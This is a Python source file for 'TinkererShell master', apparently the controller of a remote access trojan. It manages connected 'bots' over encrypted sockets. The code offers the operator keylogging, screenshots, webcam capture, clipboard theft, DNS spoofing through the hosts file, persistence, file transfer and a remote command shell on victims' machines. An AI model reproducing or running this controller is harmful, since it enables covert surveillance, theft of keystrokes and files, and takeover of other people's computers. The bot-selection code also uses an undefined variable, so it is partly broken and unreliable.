#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
"""TinkererShell master, a simple bots manager.\n"""

# Written By Ananke: https://github.com/4n4nk3
import sys

sys.path.append('./modules/')
import datetime
import os
import cmd
import threading
from time import sleep
from base64 import b64decode
from random import randrange
from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR, timeout

from my_crypt_func import encode_aes, decode_aes
from my_logger import logging

connected_sockets = []
active_bot = 1000
thr_exit = threading.Event()


# noinspection PyUnboundLocalVariable
def connection_gate():
    """Thread that keep accepting new bots, assigning ports, and passing them to other threads doing keep-alive.\n"""
    host = ''
    port = 4444
    # Socket definition
    s = socket(AF_INET, SOCK_STREAM)
    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    s.bind((host, port))
    logging(data_to_log='\nWelcome in TinkererShell!\nWritten By 4n4nk3: https://github.com/4n4nk3\n', printer=True)
    logging(data_to_log=('Listening on 0.0.0.0:%s...' % str(port)), printer=True)

    # Listening...
    s.listen(10)
    while True:
        while True:
            so = s
            so.settimeout(60)
            try:
                conn_gate, addr = so.accept()
                break
            except timeout:
                if thr_exit.isSet():
                    break
                pass
        if thr_exit.isSet():
            break
        # noinspection PyUnboundLocalVariable
        lengthcrypt = conn_gate.recv(1024).decode('utf-8')
        expected_length = int(decode_aes(lengthcrypt))
        encrypted_received_data: str = ''
        while len(encrypted_received_data) < expected_length:
            encrypted_received_data += conn_gate.recv(1024).decode('utf-8')
        clear_text = decode_aes(encrypted_received_data)
        logging(data_to_log=('Connection established with: ' + str(addr).split('\'')[1]), printer=True)
        while True:
            new_port = randrange(5000, 6000)
            try:
                new_so = socket(AF_INET, SOCK_STREAM)
                new_so.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
                new_so.bind((host, new_port))
                encrypted = encode_aes(str(new_port))
                # Send encrypted data's length encrypted
                conn_gate.send(bytes(encode_aes(str(len(encrypted))), 'utf-8'))
                # Sleep 1 second to let the receiver decrypt the length packet.
                sleep(1)
                # Send encrypted data
                conn_gate.send(bytes(encrypted, 'utf-8'))
                threading.Thread(target=handler, args=(new_so, new_port, clear_text)).start()
                break
            except os.error as exception_gate:
                if exception_gate.errno == 98:
                    print("Port is already in use")
                else:
                    print(exception_gate)
            if thr_exit.isSet():
                break
        if thr_exit.isSet():
            break


def handler(new_so, new_port, username):
    """Keep-alive the connected bots.\n"""
    global connected_sockets
    new_so.listen(10)
    conn_handler, addr = new_so.accept()
    lengthcrypt = conn_handler.recv(1024)
    expected_length = int(decode_aes(lengthcrypt))
    encrypted_received_data: str = ''
    while len(encrypted_received_data) < expected_length:
        encrypted_received_data += conn_handler.recv(1024).decode('utf-8')
    a = decode_aes(encrypted_received_data)
    if a == username:
        logging(data_to_log=('Connection consolidated with: {}\t{}'.format(str(addr).split('\'')[1], username)),
                printer=True)
        connected_sockets.append(
            {'conn': conn_handler, 'port': new_port, 'ip': str(addr).split('\'')[1], 'username': username,
             'status': True})
        position = len(connected_sockets) - 1
        while True:
            if position != active_bot:
                encrypted = encode_aes('KeepAlive')
                # Send encrypted data's length encrypted
                conn_handler.send(bytes(encode_aes(str(len(encrypted))), 'utf-8'))
                # Sleep 1 second to let the receiver decrypt the length packet.
                sleep(1)
                # Send encrypted data
                conn_handler.send(bytes(encrypted, 'utf-8'))
            sleep(60)
            if thr_exit.isSet():
                break
    conn_handler.close()


def sender(data_to_send: str) -> bool:
    """Send a string to the connected bot. Make sure string is not empty in order to prevent reception exceptions.\n"""
    if not data_to_send:
        data_to_send = 'Ok (no output)'
    # Encrypt data
    encrypted = encode_aes(data_to_send)
    # Send encrypted data's length encrypted
    conn.send(bytes(encode_aes(str(len(encrypted))), 'utf-8'))
    # Sleep 1 second to let the receiver decrypt the length packet.
    sleep(1)
    # Send encrypted data
    conn.send(bytes(encrypted, 'utf-8'))
    return True


def receiver(printer=False) -> str:
    """Receive encrypted data and return clear-text string.\n"""
    lengthcrypt = conn.recv(1024).decode('utf-8')
    expected_length = int(decode_aes(lengthcrypt))
    encrypted_received_data: str = ''
    while len(encrypted_received_data) < expected_length:
        encrypted_received_data += conn.recv(1024).decode('utf-8')
    clear_text = decode_aes(encrypted_received_data)
    if printer is True:
        logging(data_to_log=clear_text, printer=True)
    return clear_text


def ask_input(phrase: object = False, send: bool = False) -> str:
    """Ask for user input with custom phrase or default to >>>. If needed send input to connected bot.\n"""
    if phrase:
        user_input = input(phrase)
        logging(data_to_log=(''.join((phrase, user_input))))
        if send is True:
            sender(user_input)
    else:
        user_input = input('>>> ')
        logging(data_to_log=('>>> ' + user_input))
        if send is True:
            sender(user_input)
    return user_input


def downloader() -> bool:
    """Download a file from the bot.\n"""
    sender('SHdownload')
    # File to be downloaded
    receiver(printer=True)
    ask_input(send=True)
    received_file_data = receiver()
    # Local filename to save downloaded file
    local_filename = ask_input(phrase='Insert name which you want to use to save the file\t\texample.txt\n\n >>> ')
    # sender(a)
    if received_file_data != 'reachedexcept':
        try:
            downloaded_file_descriptor = open(local_filename, 'wb')
            downloaded_file_descriptor.write(bytes(received_file_data, 'utf-8'))
            downloaded_file_descriptor.close()
            logging(data_to_log=('File saved in ' + os.getcwd() + '\n'), printer=True)
        except Exception as exception_downloader:
            logging(data_to_log=str(exception_downloader), printer=True)
    else:
        remote_exception = receiver()
        logging(
            data_to_log='Operation aborted (received <reachedexcept> string from bot)\nDetails: ' + remote_exception,
            printer=True)
    return True


def uploader() -> bool:
    """Upload a file to the bot.\n"""
    sender('SHupload')
    file_to_upload = ask_input(phrase=('Insert the name of the file that you want to upload\t\t' + os.path.normcase(
        'C:/boot.ini') + '\n\n >>> '))
    ask_input(phrase='Insert name which you want to use to save the file\t\tC:\\boot.ini\n\n >>> ', send=True)
    try:
        upload_descriptor = open(file_to_upload, 'rb')
        file_data = upload_descriptor.read()
        upload_descriptor.close()
    except Exception as exception_uploader:
        logging(data_to_log=str(exception_uploader), printer=True)
        file_data = 'reachedexcept'
    sender(file_data.decode('utf-8'))
    receiver(printer=True)
    return True


def screenshot() -> bool:
    """Take a full screen screenshot from the bot.\n"""
    sender('SHscreenshot')
    received_file_data = b64decode(receiver())
    if received_file_data != 'reachedexcept':
        counter = 0
        while True:
            local_filename = 'screenshot-{}-{}-{}.png'.format(connected_sockets[active_bot]['ip'],
                                                              connected_sockets[active_bot]['username'], str(counter))
            if not os.path.isfile(local_filename):
                break
            counter += 1
        try:
            downloaded_file_descriptor = open(local_filename, 'wb')
            downloaded_file_descriptor.write(received_file_data)
            downloaded_file_descriptor.close()
            logging(data_to_log=('Screenshot saved as ' + local_filename + '\n'), printer=True)
        except Exception as exception_downloader:
            logging(data_to_log=str(exception_downloader), printer=True)
    else:
        remote_exception = receiver()
        logging(
            data_to_log='Operation aborted (received <reachedexcept> string from bot)\nDetails: ' + remote_exception,
            printer=True)
    return True


def webcam_pic() -> bool:
    """Take a full screen screenshot from the bot.\n"""
    sender('SHwebcampic')
    received_file_data = b64decode(receiver())
    if received_file_data != 'reachedexcept':
        counter = 0
        while True:
            local_filename = 'webcam-pic-{}-{}-{}.png'.format(connected_sockets[active_bot]['ip'],
                                                              connected_sockets[active_bot]['username'], str(counter))
            if not os.path.isfile(local_filename):
                break
            counter += 1
        try:
            downloaded_file_descriptor = open(local_filename, 'wb')
            downloaded_file_descriptor.write(received_file_data)
            downloaded_file_descriptor.close()
            logging(data_to_log=('Screenshot saved as ' + local_filename + '\n'), printer=True)
        except Exception as exception_downloader:
            logging(data_to_log=str(exception_downloader), printer=True)
    else:
        remote_exception = receiver()
        logging(
            data_to_log='Operation aborted (received <reachedexcept> string from bot)\nDetails: ' + remote_exception,
            printer=True)
    return True


def clip_copy():
    """Download clipboard content from bot.\n"""
    sender('SHclipboard')
    receiver(printer=True)


def processkiller():
    """Kill a process.\n"""
    sender('SHprocesskill')
    receiver(printer=True)
    ask_input(send=True)
    receiver(printer=True)


def dnsspoofer():
    """Start DNS spoofing via 'hosts' file.\n"""
    sender('SHdnstart')
    receiver(printer=True)
    ask_input(send=True)
    receiver(printer=True)
    ask_input(send=True)
    receiver(printer=True)


def keylogdownloader():
    """Download keystrokes logged by keylogger.\n"""
    sender('SHkeylogdownload')
    keylogged_data = receiver()
    local_filename = 'keylogged-{}-{}.txt'.format(connected_sockets[active_bot]['ip'],
                                                  connected_sockets[active_bot]['username'])
    if keylogged_data == 'reachedexcept':
        receiver(printer=True)
    else:
        try:
            keylogged_descriptor = open(local_filename, 'a')
            keylogged_descriptor.write(keylogged_data)
            keylogged_descriptor.close()
            logging(data_to_log='Download completed!\n Use <SHkeylog show> to see keylogged data\n', printer=True)
        except Exception as exception_keylogdownloader:
            logging(data_to_log=str(exception_keylogdownloader), printer=True)


def keylogshower():
    """Show downloaded keystrokes in a tk window.\n"""
    local_filename = 'keylogged-{}-{}.txt'.format(connected_sockets[active_bot]['ip'],
                                                  connected_sockets[active_bot]['username'])
    try:
        keylogged_descriptor = open(local_filename, 'r')
        print(keylogged_descriptor.read())
        keylogged_descriptor.close()
    except IOError as exception_keylogshower:
        if exception_keylogshower.errno == 2:
            # noinspection PyPep8
            logging(
                data_to_log='It looks like you never downloaded keylogged data from bot!\n Going to download it now for you...\n',
                printer=True)
            keylogdownloader()
            keylogshower()
        else:
            logging(data_to_log=str(exception_keylogshower), printer=True)


def kill_current_bot() -> bool:
    # noinspection PyPep8
    """Terminate remote backdoor thread.\n"""
    global connected_sockets
    double_check = ask_input(phrase='Are you sure? yes/no\n')
    if double_check == 'yes':
        sender('SHkill')
        response = receiver()
        if response == 'mistochiudendo':
            pass
        else:
            logging(data_to_log=response, printer=True)
        connected_sockets[active_bot]['status'] = False
        return True
    logging(data_to_log='Operation aborted\n', printer=True)
    return False


def quit_utility() -> bool:
    # noinspection PyPep8
    """Ask if user wants to terminate backdoor threads in connected bots and kill them, then exits.\n"""
    global conn
    global thr_exit
    double_check = ask_input(phrase='Are you sure? yes/no\n')
    if double_check == 'yes':
        kill_all = ask_input(phrase='Do you want to kill all the bots? yes/no\n')
        for bot in connected_sockets:
            if bot['status'] is True:
                conn = bot['conn']
                if kill_all == 'yes':
                    sender('SHkill')
                else:
                    sender('SHquit')
                response = receiver()
                if response == 'mistochiudendo':
                    pass
                else:
                    logging(data_to_log=response, printer=True)
        thr_exit.set()
        return True
    logging(data_to_log='Operation aborted\n', printer=True)
    return False


def command_executer():
    CommandExecutorInput().cmdloop()


def tinkerer_menu():
    TinkererShellInput().cmdloop()


# =================================================================================================

# noinspection PyUnusedLocal,PyUnusedLocal,PyPep8Naming,PyMethodMayBeStatic,PyMethodMayBeStatic
class BotSwitcher(cmd.Cmd):
    """Bots selection handler.\n"""
    global active_bot
    global conn
    prompt = '\n(SHbots) '

    # ---------------------------------------------------------------------------------------------
    def do_SHbots(self, option):
        """SHbots [option]\n\tlist: List connected bots\n\t[bot number]: Interact with target bot\n"""
        global active_bot
        global conn
        if option:
            if option == 'list':
                active_bots_str = '\nActive bots:'
                inactive_bots_str = '\n\nInactive bots:'
                for bots_counter, bot in enumerate(connected_sockets):
                    if bot['status'] is True:
                        active_bots_str += '\n\tBot # {}\t\t{}\t{}'.format(bots_counter, bot['ip'], bot['username'])
                    else:
                        inactive_bots_str += '\n\tBot # {}\t\t{}\t{}'.format(bots_counter, bot['ip'], bot['username'])
                printable_bots = active_bots_str + inactive_bots_str + '\n\n\nYou can interact with a bot by entering its number #'
                logging(data_to_log=printable_bots, printer=True)
            elif option.isdigit() is True:
                try:
                    if connected_sockets[int(command)]['status'] is True:
                        double_check = ask_input(phrase='Are you sure? yes/no\n')
                        if double_check == 'yes':
                            active_bot = int(command)
                            conn = connected_sockets[int(command)]['conn']
                            tinkerer_menu()
                        else:
                            logging(data_to_log='Selection canceled\n', printer=True)
                except Exception as exception_default:
                    if str(exception_default) == 'list index out of range':
                        logging(data_to_log='The selected bot does not exist\n', printer=True)
                    else:
                        logging(data_to_log=str(exception_default), printer=True)
            else:
                print('Aborted: unknown option\n')
        else:
            print('Aborted: an option is required\n')

    # ---------------------------------------------------------------------------------------------
    def do_SHquit(self, option) -> bool:
        """SHquit\n\tQuit and close the connection\n"""
        return quit_utility()

    def emptyline(self):
        pass

    # =============================================================================================
    def precmd(self, line):
        logging(data_to_log=('\n(Bots) ' + line))
        return cmd.Cmd.precmd(self, line)

    # =============================================================================================
    def postloop(self):
        logging(data_to_log='\nQuitting!', printer=True)


# =================================================================================================

# noinspection PyUnusedLocal,PyPep8Naming,PyMethodMayBeStatic
class CommandExecutorInput(cmd.Cmd):
    """Command Executor Input handler.\n"""

    prompt = '\n  >>> '

    # ---------------------------------------------------------------------------------------------
    def do_SHreturn(self, option):
        """SHreturn\n\tReturn to TinkererShell interactive mode.\n"""
        logging(data_to_log='Returning to TinkererShell interactive mode...\n', printer=True)
        return True

    # ---------------------------------------------------------------------------------------------
    def default(self, command):
        if command != 'SHquit' and command != 'SHkill':
            sender(command)
            response = receiver()
            if response == 'reachedexcept':
                receiver(printer=True)
            else:
                logging(data_to_log=response, printer=True)

    # =============================================================================================
    def precmd(self, line):
        logging(data_to_log=('\n  >>> ' + line))
        return cmd.Cmd.precmd(self, line)


# =================================================================================================
# noinspection PyMethodMayBeStatic
class TinkererShellInput(cmd.Cmd):
    """TinkererShell.\n"""

    prompt = '\n(SHCmd) '

    # ---------------------------------------------------------------------------------------------
    # noinspection PyMethodMayBeStatic
    def do_SHprocess(self, option):
        """SHprocesses [option]\n\tlist: List active processes\n\tkill: Kill an active process\n"""
        if option:
            if option == 'list':
                sender('SHprocesslist')
                receiver(printer=True)
            elif option == 'kill':
                processkiller()
            else:
                print('Aborted: unknown option\n')
        else:
            print('Aborted: an option is required\n')

    # ---------------------------------------------------------------------------------------------
    def do_SHdns(self, option):
        """SHdns [option]\n\tstart: Start DNS spoofing\n\tstop: Stop DNS spoofing\n"""
        if option:
            if option == 'start':
                dnsspoofer()
            elif option == 'stop':
                sender('SHdnsstop')
                receiver(printer=True)
            else:
                print('Aborted: unknown option\n')
        else:
            print('Aborted: an option is required\n')

    # ---------------------------------------------------------------------------------------------
    def do_SHkeylog(self, option):
        # noinspection PyPep8
        """SHkeylog [option]\n\tstatus: Show status of the keylogger\n\tstart: Start keylogger\n\tstop: Stop keylogger\n\tdownload: Download keylogged data to local machine and delete it from remote bot\n\tshow: Show downloaded keylogged data\n"""
        if option:
            if option == 'status':
                sender('SHkeylogstatus')
                receiver(printer=True)
            elif option == 'start':
                sender('SHkeylogstart')
                receiver(printer=True)
            elif option == 'stop':
                sender('SHkeylogstop')
                receiver(printer=True)
            elif option == 'download':
                keylogdownloader()
            elif option == 'show':
                keylogshower()
            else:
                print('Aborted: unknown option\n')
        else:
            print('Aborted: an option is required\n')

    # ---------------------------------------------------------------------------------------------
    # noinspection PyUnusedLocal
    def do_SHscreenshot(self, option):
        """SHscreenshot\n\tGrab a screenshot of the whole screen (multiple monitors supported)\n"""
        screenshot()

    # ---------------------------------------------------------------------------------------------
    # noinspection PyUnusedLocal
    def do_SHwebcampic(self, option):
        """SHwebcampic\n\tGrab a picture using the webcam of the remote host\n"""
        webcam_pic()

    # ---------------------------------------------------------------------------------------------
    # noinspection PyUnusedLocal
    def do_SHclipboard(self, option):
        """SHwebcampic\n\tGrab a picture using the webcam of the remote host\n"""
        clip_copy()

    # ---------------------------------------------------------------------------------------------
    # noinspection PyUnusedLocal
    def do_SHdownload(self, option):
        """SHdownload\n\tDownload a file\n"""
        downloader()

    # ---------------------------------------------------------------------------------------------
    # noinspection PyUnusedLocal
    def do_SHupload(self, option):
        """SHupload\n\tUpload a file\n"""
        uploader()

    # ---------------------------------------------------------------------------------------------
    # noinspection PyUnusedLocal
    def do_SHexec(self, option):
        """SHexec\n\tUse remote system command shell\n"""
        command_executer()

    # ---------------------------------------------------------------------------------------------
    def do_SHpersistence(self, option):
        # noinspection PyPep8
        """"SHpersistence [option]\n\tstatus: Show status of the persistence module\n\tenable: Enable persistence installation\n\tdisable: Disable persistence installation\n"""
        if option == 'enable':
            sender('SHpersistenceenable')
            receiver(printer=True)
        elif option == 'disable':
            sender('SHpersistencedisable')
            receiver(printer=True)
        elif option == 'status':
            sender('SHpersistencestatus')
            receiver(printer=True)
        else:
            print('Aborted: unknown option\n')

    # ---------------------------------------------------------------------------------------------
    # noinspection PyUnusedLocal
    def do_SHreturn(self, option):
        """SHreturn\n\tReturn to TinkererShell bot selection mode.\n"""
        logging(data_to_log='Returning to TinkererShell bot selection mode...\n', printer=True)
        return True

    # noinspection PyUnusedLocal
    def do_SHkill(self, option):
        """SHkill\n\tKill current bot and return to TinkererShell bot selection mode.\n"""
        return kill_current_bot()

    # ---------------------------------------------------------------------------------------------
    def emptyline(self):
        pass

    # =============================================================================================
    def precmd(self, line):
        logging(data_to_log=('\n(Cmd) ' + line))
        return cmd.Cmd.precmd(self, line)


# =============================================================================================#=============================================================================================
if __name__ == '__main__':
    """Main function.\n"""

    # Setup sessionlog.txt file where I am gonna log all console output
    if os.path.isfile('sessionlog.txt') and not os.access('sessionlog.txt', os.W_OK):
        chiusura = input(
            '[-] sessionlog.txt access to log file denied.\nTry running this program as root... Press Enter to '
            'exit...')
        sys.exit(0)
    try:
        f = open('sessionlog.txt', 'a')
        f.write(
            '\n\n\n\n\n' + datetime.datetime.now().strftime("%Y-%m-%d %H:%M") + '\n[*] Start of session\'s logs [*]\n')
        f.close()
    except Exception as exception:
        print(exception)

    threading.Thread(target=connection_gate).start()

    sleep(5)
    # Start command loop
    BotSwitcher().cmdloop()
